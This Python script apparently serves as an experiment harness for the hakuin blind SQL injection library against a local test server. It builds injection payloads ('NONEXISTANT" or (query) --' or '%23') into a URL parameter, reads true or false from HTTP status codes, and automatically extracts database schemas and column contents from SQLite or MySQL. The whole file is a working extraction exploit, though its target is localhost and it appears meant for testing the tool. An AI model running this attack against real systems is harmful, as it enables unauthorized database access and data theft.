import json
import logging
import requests
import sys

from hakuin.dbms import SQLite, MySQL
from hakuin import Extractor, Requester



logging.basicConfig(level=logging.INFO)



class R(Requester):
    def __init__(self, dbms):
        self.dbms = dbms


    def request(self, ctx, query):
        if self.dbms == 'sqlite':
            url = f'http://127.0.0.1:8000/large_content?name=NONEXISTANT" or ({query}) --'
        else:
            url = f'http://127.0.0.1:8000/large_content?name=NONEXISTANT" or ({query}) %23'

        r = requests.get(url)
        assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'

        # print(ctx.buffer, r.status_code == 200, query)
        return r.status_code == 200



def main():
    assert len(sys.argv) >= 2, 'python3 experiment_generic_db.py <dbms> [<table> <column>]'
    argv = sys.argv + [None, None]
    _, dbms_type, table, column = argv[:4]

    allowed = ['sqlite', 'mysql']
    assert dbms_type in allowed, f'dbms must be in {allowed}'

    requester = R(dbms_type)
    dbms = SQLite() if dbms_type == 'sqlite' else MySQL()
    ext = Extractor(requester, dbms)

    if table is None:
        res = ext.extract_schema(strategy='model')
        print(json.dumps(res, indent=4))
    else:
        res = ext.extract_column_text(table, column)
        # res = ext.extract_column_int(table, column)
        print(json.dumps(res, indent=4))



if __name__ == '__main__':
    main()
